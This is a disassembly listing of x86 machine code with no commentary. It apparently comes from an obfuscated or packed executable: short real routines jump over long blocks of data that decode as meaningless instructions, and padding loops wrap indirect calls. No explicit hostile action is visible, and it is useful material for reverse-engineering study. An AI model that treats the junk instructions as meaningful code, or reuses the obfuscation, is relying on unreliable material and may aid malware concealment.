  408c25:	mov    cl,0xe3
  408c27:	jo     0x408c3b
  408c29:	ins    BYTE PTR es:[edi],dx
  408c2a:	jmp    0x3bffae81
  408c2f:	ins    DWORD PTR es:[edi],dx
  408c30:	fs mov dh,0x74
  408c33:	sub    BYTE PTR [edi-0x5bba824d],dl
  408c39:	cdq    
  408c3a:	stos   DWORD PTR es:[edi],eax
  408c3b:	sub    DWORD PTR [eax],eax
  408c3d:	xor    BYTE PTR ds:0xcccf5c6a,dh
  408c43:	test   BYTE PTR [edx+eiz*2+0x7cc32bf8],0x52
  408c4b:	push   ecx
  408c4c:	xchg   ebp,eax
  408c4d:	xor    edx,DWORD PTR [eax-0x1faa18bf]
  408c53:	popa   
  408c54:	pop    ebx
  408c55:	inc    ecx
  408c56:	cmp    BYTE PTR [edi],0x61
  408c59:	mov    ds:0x3bccfb7,eax
  408c5e:	mov    al,0x2e
  408c60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c61:	or     BYTE PTR [edi+0x63],al
  408c64:	inc    esi
  408c65:	rcr    BYTE PTR [ecx+esi*2],cl
  408c68:	sti    
  408c69:	xchg   esp,eax
  408c6a:	mov    ebp,0x1848c242
  408c6f:	sub    BYTE PTR [edi],cl
  408c71:	leave  
  408c72:	das    
  408c73:	(bad)  
  408c74:	test   eax,0xf4083ee3
  408c79:	xchg   ebp,eax
  408c7a:	pop    ds
  408c7b:	adc    dh,BYTE PTR [eax+edi*8-0x52]
  408c7f:	mul    esi
  408c81:	sub    ebp,eax
  408c83:	xchg   ecx,eax
  408c84:	es inc esi
  408c86:	fdiv   QWORD PTR [esi-0x9]
  408c89:	(bad)  
  408c8a:	repnz mov eax,0xef347cd1
  408c90:	xor    eax,0x4b2f0e7d
  408c95:	jmp    0x408cd7
  408c97:	adc    eax,esi
  408c99:	in     al,dx
  408c9a:	loopne 0x408c99
  408c9c:	or     edx,DWORD PTR [edx]
  408c9e:	call   DWORD PTR [edx+eiz*1-0x3bc9ec15]
  408ca5:	add    ah,BYTE PTR [esi-0x21]
  408ca8:	aad    0x12
  408caa:	sub    al,BYTE PTR [ebx-0x3dd7d7c]
  408cb0:	loopne 0x408c3f
  408cb2:	ins    BYTE PTR es:[edi],dx
  408cb3:	ja     0x408c9b
  408cb5:	mov    bl,0x4a
  408cb7:	aaa    
  408cb8:	imul   ecx,DWORD PTR [ecx+edi*8+0x7323795a],0xdb0a53c2
  408cc3:	ins    DWORD PTR es:[edi],dx
  408cc4:	ins    DWORD PTR es:[edi],dx
  408cc5:	dec    esi
  408cc6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cc7:	(bad)  
  408cc9:	ds das 
  408ccb:	mov    WORD PTR [esi+0x68f6cf04],ss
  408cd1:	mov    cl,0xc3
  408cd3:	cmp    ch,BYTE PTR [ecx-0x574d8864]
  408cd9:	mov    edi,0xd2408a96
  408cde:	outs   dx,BYTE PTR ds:[esi]
  408cdf:	pop    ds
  408ce0:	mov    esi,ss
  408ce2:	leave  
  408ce3:	ret    0x44cf
  408ce6:	movzx  eax,WORD PTR [eax+edx*4]
  408cea:	xor    eax,0x8a43
  408cef:	add    eax,edi
  408cf1:	mov    edi,DWORD PTR [ebp-0x14]
  408cf4:	mov    BYTE PTR [ebp+edi*1-0x58],al
  408cf8:	mov    eax,DWORD PTR [ebp-0xc]
  408cfb:	inc    edx
  408cfc:	cmp    edx,eax
  408cfe:	jne    0x408b9f
  408d04:	pop    edi
  408d05:	pop    ebx
  408d06:	mov    eax,DWORD PTR [ebp-0x8]
  408d09:	mov    edx,DWORD PTR [ebp+0x10]
  408d0c:	xor    eax,ecx
  408d0e:	jmp    0x408e37
  408d13:	inc    esp
  408d14:	(bad)  
  408d15:	jno    0x408cee
  408d17:	icebp  
  408d18:	stc    
  408d19:	js     0x408d80
  408d1b:	xchg   esp,eax
  408d1c:	ins    BYTE PTR es:[edi],dx
  408d1d:	retf   0x6da3
  408d20:	jb     0x408cae
  408d22:	and    bh,BYTE PTR [ecx]
  408d24:	das    
  408d25:	jle    0x408da5
  408d27:	or     bh,BYTE PTR [edi+0x7e]
  408d2a:	jle    0x408cbf
  408d2c:	sbb    al,0x41
  408d2e:	push   esi
  408d2f:	rcr    BYTE PTR [eax],cl
  408d31:	mov    eax,ds:0x7635b962
  408d36:	dec    edx
  408d37:	xlat   BYTE PTR ds:[ebx]
  408d38:	stos   BYTE PTR es:[edi],al
  408d39:	sub    dh,BYTE PTR [edi+esi*4+0x1b87cc39]
  408d40:	in     eax,0x1b
  408d42:	push   0x66a4d622
  408d47:	shr    ch,0x8
  408d4a:	mov    al,0xed
  408d4c:	pop    ss
  408d4d:	addr16 ficomp WORD PTR es:[bx+di]
  408d52:	sub    esp,ebx
  408d54:	cmp    al,0xb0
  408d56:	dec    ebx
  408d57:	and    DWORD PTR [edx],ebp
  408d59:	cmp    DWORD PTR [esi],0xa0bea162
  408d5f:	xor    DWORD PTR [ecx-0x3a],ecx
  408d62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d63:	hlt    
  408d64:	inc    esp
  408d65:	outs   dx,DWORD PTR ds:[esi]
  408d66:	arpl   WORD PTR [ebx-0x179793bb],bx
  408d6c:	outs   dx,BYTE PTR ds:[esi]
  408d6d:	fs out dx,eax
  408d6f:	add    BYTE PTR [ebx-0x1ea1a9cd],dl
  408d75:	loopne 0x408cff
  408d77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d78:	xor    BYTE PTR [ecx+0x6634bba9],bl
  408d7e:	(bad)  [edx+0x5b1e1152]
  408d84:	es mov edx,0xe3d33fd5
  408d8a:	cmp    eax,0x23cdc7d0
  408d8f:	mov    ebx,0x63166e45
  408d94:	jle    0x408d84
  408d96:	imul   esi,DWORD PTR [ebx+ebp*4-0x2],0x2a915845
  408d9e:	(bad)  
  408d9f:	and    BYTE PTR [eax],bl
  408da1:	mov    esi,ecx
  408da3:	es jle 0x408da7
  408da6:	ret    
  408da7:	inc    esi
  408da8:	jne    0x408d57
  408daa:	test   al,0xd8
  408dac:	lods   al,BYTE PTR ds:[esi]
  408dad:	test   BYTE PTR [ecx],ah
  408daf:	cmp    eax,0x2d553991
  408db4:	sbb    cl,BYTE PTR [ebx]
  408db6:	stos   DWORD PTR es:[edi],eax
  408db7:	bound  ecx,QWORD PTR [esi+ecx*4]
  408dba:	ja     0x408e15
  408dbc:	xor    eax,DWORD PTR [edi]
  408dbe:	iret   
  408dbf:	daa    
  408dc0:	sbb    DWORD PTR [ebx],esp
  408dc2:	rol    cl,0x73
  408dc5:	stos   BYTE PTR es:[edi],al
  408dc6:	mov    eax,0x4f2a7fe0
  408dcb:	test   al,0x44
  408dcd:	pop    ebp
  408dce:	ss ds out dx,eax
  408dd1:	mov    esi,0x317b7c49
  408dd6:	mov    ecx,0xd59080a1
  408ddb:	add    bl,BYTE PTR [ebp+0x37a80bbb]
  408de1:	xchg   edi,eax
  408de2:	pop    es
  408de3:	push   edx
  408de4:	es stos DWORD PTR es:[edi],eax
  408de6:	mov    ebx,0x4610fdd4
  408deb:	(bad)  
  408dec:	mov    ebx,0xe23b808f
  408df1:	lods   al,BYTE PTR ds:[esi]
  408df2:	sbb    eax,edx
  408df4:	fistp  QWORD PTR [ebx]
  408df6:	adc    bl,ch
  408df8:	push   edi
  408df9:	cdq    
  408dfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dfb:	aas    
  408dfc:	and    BYTE PTR ds:0x9df41c5e,bl
  408e02:	push   esp
  408e03:	adc    eax,0xecf38029
  408e08:	pop    edi
  408e09:	jne    0x408da6
  408e0b:	jbe    0x408de9
  408e0d:	push   eax
  408e0e:	mov    cl,0xb7
  408e10:	in     al,0xae
  408e12:	pop    ebp
  408e13:	push   esp
  408e14:	sar    DWORD PTR ds:0x1d361a1d,1
  408e1a:	sub    bh,al
  408e1c:	adc    BYTE PTR [ebx+0x542b8f61],al
  408e22:	mov    ecx,0x4d092cf
  408e27:	mov    al,ds:0x436aba75
  408e2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e2d:	scas   al,BYTE PTR es:[edi]
  408e2e:	cdq    
  408e2f:	pop    ss
  408e30:	test   eax,0x581cbd68
  408e35:	dec    ebx
  408e36:	and    al,0x3
  408e38:	(bad)  
  408e39:	mov    DWORD PTR [edx],eax
  408e3b:	jmp    0x408f64
  408e40:	dec    eax
  408e41:	sub    ecx,DWORD PTR [edx]
  408e43:	lock imul edx,DWORD PTR [ecx+0x1c4aeb48],0x893de2b
  408e4e:	push   ds
  408e4f:	inc    ecx
  408e50:	xor    eax,0xa7e7e2c
  408e55:	jg     0x408ed5
  408e57:	jle    0x408e11
  408e59:	xor    eax,0xf7eb58eb
  408e5e:	xor    al,0xe7
  408e60:	inc    esi
  408e61:	rcr    DWORD PTR [ebp+0x57],cl
  408e64:	mov    edi,0x60d1c22f
  408e69:	repz adc DWORD PTR [eax],edi
  408e6c:	mov    bh,0x34
  408e6e:	mov    ch,BYTE PTR [ebx+eax*2]
  408e71:	cli    
  408e72:	add    DWORD PTR [ecx],edx
  408e74:	xor    BYTE PTR [eax-0x12b45ba2],ch
  408e7a:	(bad)  
  408e7b:	aam    0x61
  408e7d:	push   ecx
  408e7e:	mov    ah,0xb5
  408e80:	fsub   DWORD PTR [ecx+0x727d5d53]
  408e86:	cdq    
  408e87:	jae    0x408e56
  408e89:	push   eax
  408e8a:	das    
  408e8b:	inc    esp
  408e8c:	or     edx,DWORD PTR [esp+eiz*8]
  408e8f:	xchg   ebx,eax
  408e90:	add    eax,0xf2ba5c9d
  408e95:	mov    esp,0x37305e6a
  408e9a:	mov    edi,0xd1ffad0a
  408e9f:	sbb    al,0x5
  408ea1:	cmp    DWORD PTR [edx-0x5f84d2ba],esp
  408ea7:	cld    
  408ea8:	mov    WORD PTR [ecx],ss
  408eaa:	rcl    BYTE PTR [edi],0xd1
  408ead:	int    0xc0
  408eaf:	shl    BYTE PTR [eax+0x24],cl
  408eb2:	dec    eax
  408eb3:	or     cl,BYTE PTR [esi-0x429c1eb7]
  408eb9:	add    DWORD PTR [eax+0x50fbdb64],ebx
  408ebf:	inc    ebp
  408ec0:	stos   DWORD PTR es:[edi],eax
  408ec1:	push   DWORD PTR [edi]
  408ec3:	in     eax,dx
  408ec4:	push   edx
  408ec5:	repz cmp DWORD PTR [edx+ecx*1-0x42],0xffffffd1
  408ecb:	fdivrp st(1),st
  408ecd:	dec    ecx
  408ece:	stos   DWORD PTR es:[edi],eax
  408ecf:	sbb    esp,ebx
  408ed1:	arpl   WORD PTR [edx-0x516fcb68],si
  408ed7:	xor    eax,0xf9e54a79
  408edc:	sbb    al,0x7f
  408ede:	dec    esi
  408edf:	cmp    DWORD PTR [esi+0xb1b46de],eax
  408ee5:	test   BYTE PTR [esi],0x5a
  408ee8:	mov    ch,0x68
  408eea:	pop    eax
  408eeb:	gs aas 
  408eed:	pop    ss
  408eee:	xchg   edx,eax
  408eef:	and    ch,al
  408ef1:	in     eax,dx
  408ef2:	push   esi
  408ef3:	add    DWORD PTR [ecx-0x757141eb],0x25485385
  408efd:	inc    ecx
  408efe:	jp     0x408ea3
  408f00:	loopne 0x408e9a
  408f02:	sbb    DWORD PTR [ebp+edx*2+0x7d0aa07e],esp
  408f09:	fnstenv [ebx+0x7dbfb058]
  408f0f:	jne    0x408ea7
  408f11:	pop    ds
  408f12:	dec    edi
  408f13:	pop    DWORD PTR [ebx]
  408f15:	lock add ebx,ebp
  408f18:	xor    eax,0x9afbd338
  408f1d:	pop    es
  408f1e:	nop
  408f1f:	inc    eax
  408f20:	cmp    BYTE PTR [edi+0xe],ah
  408f23:	push   edi
  408f24:	dec    ebp
  408f25:	or     eax,0x853f874f
  408f2a:	jae    0x408f28
  408f2c:	hlt    
  408f2d:	mov    edx,ss
  408f2f:	daa    
  408f30:	jae    0x408f65
  408f32:	mov    ebx,0xf3c24bbf
  408f37:	jle    0x408ec4
  408f39:	lds    esi,FWORD PTR [edx+0x62ba50fb]
  408f3f:	sar    DWORD PTR [edi],cl
  408f41:	jecxz  0x408faa
  408f43:	dec    edx
  408f44:	dec    edx
  408f45:	scas   eax,DWORD PTR es:[edi]
  408f46:	rcl    DWORD PTR [edx],cl
  408f48:	out    0xc9,eax
  408f4a:	mov    BYTE PTR [esp+esi*2+0x7068009f],0xb9
  408f52:	adc    DWORD PTR [ecx-0x5d],ebx
  408f55:	mov    ds:0x5a357781,al
  408f5a:	jmp    0x408fc5
  408f5c:	fnstenv [eax]
  408f5e:	lahf   
  408f5f:	cmp    edx,DWORD PTR [eax]
  408f61:	das    
  408f62:	mov    eax,DWORD PTR [eax]
  408f64:	mov    eax,DWORD PTR [ebp-0x8]
  408f67:	xor    eax,ecx
  408f69:	add    eax,esi
  408f6b:	mov    DWORD PTR [ebp+0x8],eax
  408f6e:	mov    eax,DWORD PTR [ebp+0x8]
  408f71:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f75:	mov    dl,BYTE PTR [ebp-0x1]
  408f78:	cmp    al,dl
  408f7a:	je     0x4090e6
  408f80:	mov    eax,DWORD PTR [ebp+0x8]
  408f83:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f87:	mov    edx,DWORD PTR [ebp+0xc]
  408f8a:	cmp    al,BYTE PTR [edx]
  408f8c:	jne    0x40935e
  408f92:	mov    eax,DWORD PTR [ebp-0x8]
  408f95:	mov    edx,DWORD PTR [ebp+0xc]
  408f98:	jmp    0x4090c1
  408f9d:	jmp    0x7952d498
  408fa2:	loopne 0x40901d
  408fa4:	mov    ch,0xbe
  408fa6:	jmp    0xa2dcb935
  408fab:	xor    eax,0x7e2dc12c
  408fb0:	jle    0x408fbc
  408fb2:	jg     0x409032
  408fb4:	jle    0x408fd4
  408fb6:	mov    WORD PTR [eax],fs
  408fb8:	xchg   dh,bl
  408fba:	ins    BYTE PTR es:[edi],dx
  408fbb:	das    
  408fbc:	fcomp  st(3)
  408fbe:	mov    ds:0x5b81e70b,eax
  408fc3:	sub    dl,BYTE PTR es:[eax-0x60]
  408fc7:	dec    ebx
  408fc8:	es or  al,0xd3
  408fcb:	in     eax,dx
  408fcc:	fnstenv [edi-0x3f710e5b]
  408fd2:	je     0x408f75
  408fd4:	into   
  408fd5:	mov    eax,ds:0xa1fe665c
  408fda:	dec    ecx
  408fdb:	nop
  408fdc:	xchg   edx,eax
  408fdd:	inc    edx
  408fde:	xchg   ebx,eax
  408fdf:	pop    esp
  408fe0:	jl     0x408f8c
  408fe2:	je     0x408f8c
  408fe4:	sbb    eax,0x373c9844
  408fe9:	ins    DWORD PTR es:[edi],dx
  408fea:	cmp    DWORD PTR [esi+0x59e46fc],0xffffffad
  408ff1:	inc    ecx
  408ff2:	add    eax,0x5158f570
  408ff7:	push   esp
  408ff8:	fnstcw WORD PTR [edi-0x31e80085]
  408ffe:	rcl    DWORD PTR [ecx+0x6447c7e9],1
  409004:	sbb    eax,0x222357a3
  409009:	aam    0x94
  40900b:	test   eax,0x35bfe77c
  409010:	jo     0x40900f
  409012:	jb     0x409034
  409014:	push   ds
  409015:	fucomip st,st(1)
  409017:	ret    0xd386
  40901a:	xor    dh,BYTE PTR [eax+0x774e630f]
  409020:	ins    DWORD PTR es:[edi],dx
  409021:	ins    BYTE PTR es:[edi],dx
  409022:	mov    dh,bl
  409024:	cld    
  409025:	xchg   ebp,eax
  409026:	push   edx
  409027:	fidivr DWORD PTR [ebp+0x61ebe0f3]
  40902d:	xlat   BYTE PTR ds:[ebx]
  40902e:	inc    ebx
  40902f:	cdq    
  409030:	mov    dl,BYTE PTR [eax+edi*8+0x338fd72]
  409037:	jno    0x409021
  409039:	xor    DWORD PTR [eax],ebp
  40903b:	fimul  DWORD PTR [eax]
  40903d:	mov    eax,ds:0xd083339e
  409042:	sub    bh,bh
  409044:	or     al,0x2c
  409046:	es scas al,BYTE PTR es:[edi]
  409048:	div    DWORD PTR [ecx-0x57730f6f]
  40904e:	mov    bh,0x55
  409050:	cdq    
  409051:	in     al,0x2f
  409053:	inc    edx
  409054:	mov    eax,DWORD PTR [ecx+0x21e95f2f]
  40905a:	push   edi
  40905b:	pop    ebp
  40905c:	sbb    edx,DWORD PTR ds:0xeebdff67
  409062:	mov    al,0x9b
  409064:	je     0x409090
  409066:	mov    ah,0x9f
  409068:	adc    eax,0x7dfa26ca
  40906d:	sbb    bh,ch
  40906f:	ja     0x4090ef
  409071:	lds    eax,FWORD PTR [ebp-0x66b5756f]
  409077:	mov    gs,esp
  409079:	retf   
  40907a:	jnp    0x4090b3
  40907c:	xchg   esi,eax
  40907d:	cmc    
  40907e:	ins    BYTE PTR es:[edi],dx
  40907f:	sub    ch,ah
  409081:	in     eax,0x4c
  409083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409084:	xor    ch,BYTE PTR [ebp-0x6003bc89]
  40908a:	mov    cl,0x58
  40908c:	iret   
  40908d:	int3   
  40908e:	sti    
  40908f:	in     al,dx
  409090:	xchg   DWORD PTR [ebp-0x1de47e5c],ebp
  409096:	pop    ss
  409097:	lahf   
  409098:	ret    
  409099:	xor    al,BYTE PTR [ecx+0x3a]
  40909c:	and    al,BYTE PTR [edi+0x7d]
  40909f:	test   DWORD PTR gs:[edi-0x74],ebx
  4090a3:	xor    al,0xe7
  4090a5:	ffreep st(6)
  4090a7:	adc    BYTE PTR [edx],dl
  4090a9:	add    ebp,0xffffffcf
  4090ac:	or     BYTE PTR [edx+0x7d],bl
  4090af:	mov    ecx,0x551072dd
  4090b4:	pop    eax
  4090b5:	neg    BYTE PTR [eax-0x2a4fb60c]
  4090bb:	add    eax,0x7832d705
  4090c0:	xlat   BYTE PTR ds:[ebx]
  4090c1:	movsx  edx,BYTE PTR [edx]
  4090c4:	xor    eax,ecx
  4090c6:	add    eax,esi
  4090c8:	cmp    edx,eax
  4090ca:	je     0x409229
  4090d0:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  4090d7:	lea    eax,[ebp-0x18]
  4090da:	mov    DWORD PTR [ebp-0x14],eax
  4090dd:	mov    eax,DWORD PTR [ebp-0x14]
  4090e0:	add    DWORD PTR [eax],0x705fa8e
  4090e6:	mov    eax,DWORD PTR [ebp-0x10]
  4090e9:	jmp    0x409212
  4090ee:	lods   eax,DWORD PTR ds:[esi]
  4090ef:	lock test BYTE PTR [ecx+edi*4],al
  4090f3:	sbb    BYTE PTR [ebp-0x47188557],ch
  4090f9:	daa    
  4090fa:	call   0xde26f39b
  4090ff:	and    bh,BYTE PTR [esi+0x7e]
  409102:	or     bh,BYTE PTR [edi+0x7e]
  409105:	jle    0x409166
  409107:	cwde   
  409108:	les    edx,FWORD PTR [edx]
  40910a:	iret   
  40910b:	mov    ss,WORD PTR [ebp+edi*1+0x6cef0877]
  409112:	push   edx
  409113:	pusha  
  409114:	mov    ecx,0x39c8ffe4
  409119:	pop    edx
  40911a:	dec    ecx
  40911b:	ins    BYTE PTR es:[edi],dx
  40911c:	mov    dh,0x6d
  40911e:	fs es push eax
  409121:	jl     0x409140
  409123:	hlt    
  409124:	jmp    0x7d8c5d82
  409129:	push   cs
  40912a:	out    dx,al
  40912b:	outs   dx,DWORD PTR ds:[esi]
  40912c:	push   ebx
  40912d:	ins    BYTE PTR es:[edi],dx
  40912e:	fbld   TBYTE PTR [esi+0x37]
  409131:	lock sub al,0x8f
  409134:	(bad)  
  409135:	adc    edi,DWORD PTR [ebx]
  409137:	adc    al,0x93
  409139:	fnsave [eax+0x65]
  40913c:	xchg   BYTE PTR [esi+0x45ae065d],ah
  409142:	inc    eax
  409143:	fwait
  409144:	cli    
  409145:	mov    si,0x6600
  409149:	lea    edx,[esi-0x14]
  40914c:	fisub  WORD PTR [edx]
  40914e:	and    al,cl
  409150:	cmp    al,0x77
  409152:	fwait
  409153:	jmp    0xe5ff:0x56305cca
  40915a:	rcr    DWORD PTR [ebx+edx*1+0x48],0x5a
  40915f:	add    eax,0x210a92a4
  409164:	and    al,0x67
  409166:	add    bl,BYTE PTR [edx]
  409168:	adc    al,al
  40916a:	dec    eax
  40916b:	sti    
  40916c:	cmp    bh,dh
  40916e:	push   ds
  40916f:	xchg   ebp,edx
  409171:	mov    edi,0xc9f1cc2f
  409176:	push   ds
  409177:	pop    ebp
  409178:	mov    ebp,DWORD PTR [eax-0x5a]
  40917b:	sub    dh,BYTE PTR [edx-0x7a]
  40917e:	scas   al,BYTE PTR es:[edi]
  40917f:	mov    edx,0xb02ce072
  409184:	mov    ecx,0x55703e25
  409189:	and    eax,0x965033
  40918e:	aaa    
  40918f:	and    al,BYTE PTR [ebp+0x4b]
  409192:	fdiv   DWORD PTR [edx-0x5f72251d]
  409198:	lods   eax,DWORD PTR ds:[esi]
  409199:	cmp    eax,0x1c40eb8d
  40919e:	add    al,0xbb
  4091a1:	repnz outs dx,BYTE PTR ds:[esi]
  4091a3:	jp     0x4091c8
  4091a5:	sub    dl,BYTE PTR [eax+0x55]
  4091a8:	enter  0xa395,0x3f
  4091ac:	rcr    DWORD PTR [eax],1
  4091ae:	out    0x8d,eax
  4091b0:	clc    
  4091b1:	sub    BYTE PTR [edx-0x39],al
  4091b4:	inc    BYTE PTR [ebp-0x80]
  4091b7:	pop    ebx
  4091b8:	stos   BYTE PTR es:[edi],al
  4091b9:	out    dx,eax
  4091ba:	mov    ds:0xa08b8ac1,eax
  4091bf:	ss loopne 0x409210
  4091c2:	sti    
  4091c3:	push   cs
  4091c4:	das    
  4091c5:	(bad)  
  4091c7:	adc    BYTE PTR [ebp+0x2b],ch
  4091ca:	sbb    eax,0x6a5ddfff
  4091cf:	out    0x29,eax
  4091d1:	aaa    
  4091d2:	adc    eax,0xd617b1d9
  4091d7:	cmp    DWORD PTR [esi+0x51],0xb9a233b1
  4091de:	mul    DWORD PTR [edi-0x30]
  4091e1:	fcomp  QWORD PTR [ebp-0x342c0455]
  4091e7:	mov    ds:0x599bd199,eax
  4091ec:	popf   
  4091ed:	xor    DWORD PTR [edi+ebp*4],ebp
  4091f0:	push   ebp
  4091f1:	int3   
  4091f2:	clc    
  4091f3:	int    0x80
  4091f5:	out    0x45,eax
  4091f7:	mov    ah,BYTE PTR [esi+0x58]
  4091fa:	inc    esp
  4091fb:	sub    edx,DWORD PTR [ebp+0x61b0bf0d]
  409201:	push   cs
  409202:	stos   DWORD PTR es:[edi],eax
  409203:	jmp    0xe9ba2b0d
  409208:	aas    
  409209:	sbb    esi,0xc1b5bc4a
  40920f:	mov    fs,WORD PTR [ebx-0x5a]
  409212:	mov    edx,DWORD PTR [ebp+0x8]
  409215:	xor    eax,ecx
  409217:	lea    eax,[eax+edx*1+0x32729f]
  40921e:	mov    DWORD PTR [ebp+0x8],eax
  409221:	inc    DWORD PTR [ebp+0xc]
  409224:	jmp    0x408f6e
  409229:	mov    eax,DWORD PTR [ebp-0x10]
  40922c:	xor    eax,ecx
  40922e:	jmp    0x409357
  409233:	or     DWORD PTR ds:0xd93acb2e,ebx
  409239:	stc    
  40923a:	(bad)  [ecx-0x6785839]
  409240:	cwde   
  409241:	push   cs
  409242:	adc    ebp,ecx
  409244:	and    edi,DWORD PTR [esi+0x7e]
  409247:	or     bh,BYTE PTR [edi+0x7e]
  40924a:	jle    0x40922d
  40924c:	rcl    BYTE PTR [ebp-0x49],1
  40924f:	lods   eax,DWORD PTR ds:[esi]
  409250:	dec    esp
  409251:	fbstp  TBYTE PTR [eax-0x10]
  409254:	out    0xa2,eax
  409256:	xor    eax,0x85704e35
  40925b:	mov    cl,0x82
  40925d:	rcl    ah,1
  40925f:	clc    
  409260:	mov    edi,0x52866c19
  409265:	or     eax,0xd1641d0b
  40926a:	pop    esp
  40926b:	sbb    BYTE PTR [ebx+0x75f7a193],dh
  409271:	adc    DWORD PTR [esi-0x2796942a],esp
  409277:	sbb    BYTE PTR [eax-0x4259cb36],bl
  40927d:	mov    al,0x3c
  40927f:	inc    ebx
  409280:	rcl    ecx,0x20
  409283:	xchg   edx,eax
  409284:	int    0xd8
  409286:	push   ebp
  409287:	sti    
  409288:	jp     0x4092dd
  40928a:	out    0x8e,eax
  40928c:	mov    esp,0xa9258f41
  409291:	int3   
  409292:	cmp    esp,DWORD PTR [eax]
  409294:	call   0xf80f6e9c
  409299:	gs in  eax,dx
  40929b:	test   al,0x21
  40929d:	pop    edx
  40929e:	push   ebx
  40929f:	and    eax,0x601b7ce5
  4092a4:	fcmovbe st,st(7)
  4092a6:	push   esi
  4092a7:	push   ebp
  4092a8:	in     eax,dx
  4092a9:	pop    eax
  4092aa:	or     al,0x7c
  4092ac:	jo     0x4092c0
  4092ae:	dec    eax
  4092af:	pop    eax
  4092b0:	cmp    al,0x88
  4092b2:	push   esi
  4092b3:	lods   al,BYTE PTR ds:[esi]
  4092b4:	nop
  4092b5:	in     eax,0xef
  4092b7:	jmp    0x409269
  4092b9:	sbb    al,BYTE PTR [esi+0x3b]
  4092bc:	jae    0x409262
  4092be:	mov    ebp,DWORD PTR [esi-0x658992d5]
  4092c4:	xchg   cl,ch
  4092c6:	push   es
  4092c7:	sar    BYTE PTR [eax],1
  4092c9:	loop   0x4092f4
  4092cb:	ds (bad) 
  4092cd:	jo     0x4092d5
  4092cf:	jg     0x4092b6
  4092d1:	xlat   BYTE PTR ds:[ebx]
  4092d2:	mov    eax,ds:0x9cedd8c8
  4092d7:	adc    ebx,0x8b96c82b
  4092dd:	cmp    DWORD PTR [edi-0x24406a6c],esi
  4092e3:	cli    
  4092e4:	fs icebp 
  4092e6:	mov    dh,0xd2
  4092e8:	or     al,0x45
  4092ea:	out    dx,al
  4092eb:	xchg   edx,eax
  4092ec:	jbe    0x4092a5
  4092ee:	pop    es
  4092ef:	lahf   
  4092f0:	mov    esi,es
  4092f2:	add    BYTE PTR fs:[edx-0x76],bh
  4092f6:	add    DWORD PTR [edx-0x3f5be422],ecx
  4092fc:	mov    eax,ds:0x62460fb8
  409301:	inc    edi
  409302:	ret    
  409303:	(bad)  
  409304:	dec    edx
  409305:	fsub   st,st(4)
  409307:	ret    
  409308:	int3   
  409309:	and    dl,bh
  40930b:	mov    eax,0xb39e0719
  409310:	stos   DWORD PTR es:[edi],eax
  409311:	sub    BYTE PTR [eax],al
  409313:	retf   0xf20e
  409316:	cli    
  409317:	push   ebp
  409318:	jnp    0x409388
  40931a:	push   ebx
  40931b:	sbb    DWORD PTR [ecx-0x36d8f7fe],esi
  409321:	mov    ebx,0xc2ec1222
  409326:	adc    ch,BYTE PTR [esi+0x17]
  409329:	or     edx,ebp
  40932b:	inc    edx
  40932c:	cmp    BYTE PTR [edi+0x38c4ed5e],0xa5
  409333:	push   0x50
  409335:	rcl    DWORD PTR [ebp+ebx*1-0x1271337d],0xe
  40933d:	std    
  40933e:	pop    es
  40933f:	in     eax,dx
  409340:	mul    DWORD PTR [edi-0x928eb4]
  409346:	ins    BYTE PTR es:[edi],dx
  409347:	push   0x74ca66c8
  40934c:	fiadd  DWORD PTR [ecx+0x47]
  40934f:	adc    al,0x39
  409351:	dec    esp
  409352:	or     dh,bl
  409354:	jno    0x409313
  409356:	or     DWORD PTR [ebx-0x39fcefb3],0xffffff89
  40935d:	add    DWORD PTR [esi-0x37],ebx
  409360:	ret    0xc
  409363:	push   ebp
  409364:	mov    ebp,esp
  409366:	push   ecx
  409367:	not    eax
  409369:	mov    DWORD PTR [ebp-0x4],0xf89c853c
  409370:	mov    eax,DWORD PTR [ebp-0x4]
  409373:	mov    edx,DWORD PTR [ebp+0x10]
  409376:	add    DWORD PTR ds:0x4245c6,ebx
  40937c:	mov    ecx,0x7510859
  409381:	adc    DWORD PTR ds:0x41235c,0x4245c6
  40938b:	xor    eax,ecx
  40938d:	add    eax,0x32729f
  409392:	and    DWORD PTR ds:0x412368,0x417e41
  40939c:	mov    DWORD PTR [edx],eax
  40939e:	mov    eax,DWORD PTR [ebp+0xc]
  4093a1:	and    DWORD PTR ds:0x4245be,0x0
  4093ab:	jmp    0x4093bd
  4093b0:	mov    edx,DWORD PTR ds:0x4245be
  4093b6:	inc    edx
  4093b7:	mov    DWORD PTR ds:0x4245be,edx
  4093bd:	cmp    DWORD PTR ds:0x4245be,0x14
  4093c4:	jae    0x4093eb
  4093ca:	cmp    DWORD PTR ds:0x4245be,0x1c
  4093d1:	jne    0x4093e0
  4093d7:	push   DWORD PTR [ebp-0x20]
  4093da:	call   DWORD PTR ds:0x40d1e8
  4093e0:	jmp    0x4093b0
  4093e5:	sub    DWORD PTR ds:0x41237c,ebx
  4093eb:	xor    eax,ecx
  4093ed:	adc    edx,DWORD PTR ds:0x412360
  4093f3:	push   esi
  4093f4:	add    esi,edx
  4093f6:	mov    esi,DWORD PTR [ebp+0x10]
  4093f9:	mov    edx,0x32729f
  4093fe:	add    eax,edx
  409400:	xor    DWORD PTR ds:0x41abda,0x417e49
  40940a:	mov    DWORD PTR [esi+0x4],eax
  40940d:	mov    eax,ds:0x412398
  409412:	mov    esi,DWORD PTR ds:0x421896
  409418:	sub    esi,eax
  40941a:	xor    eax,DWORD PTR [eax+esi*1]
  40941d:	mov    eax,DWORD PTR [ebp+0x14]
  409420:	mov    esi,DWORD PTR [ebp+0x10]
  409423:	mov    DWORD PTR [esi+0x8],eax
  409426:	mov    DWORD PTR ds:0x412368,0x19
  409430:	cmp    DWORD PTR ds:0x412368,0x0
  409437:	je     0x409465
  40943d:	cmp    DWORD PTR ds:0x412368,0x21
  409444:	jne    0x409455
  40944a:	push   0x2b01
  40944f:	call   DWORD PTR ds:0x40d00c
  409455:	mov    eax,ds:0x412368
  40945a:	dec    eax
  40945b:	mov    ds:0x412368,eax
  409460:	jmp    0x409430
  409465:	mov    eax,DWORD PTR [ebp+0x18]
